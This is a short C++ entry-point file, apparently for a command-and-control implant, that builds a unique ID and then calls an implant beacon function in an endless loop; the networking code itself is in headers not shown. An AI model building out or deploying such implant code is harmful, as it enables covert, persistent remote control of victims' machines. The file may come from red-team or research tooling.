#ifdef _WIN32
#define WIN32_LEAN_AND_MEAN
#endif

#include "implant.h"
#include "misc.h"
#include <iostream>

int main() {
    //implant::initConnection();
    misc::buildUID();
    while (true) { // Run indefinitely
        // Call the beacon function
        implant::beacon();
    }

    return 0;
}
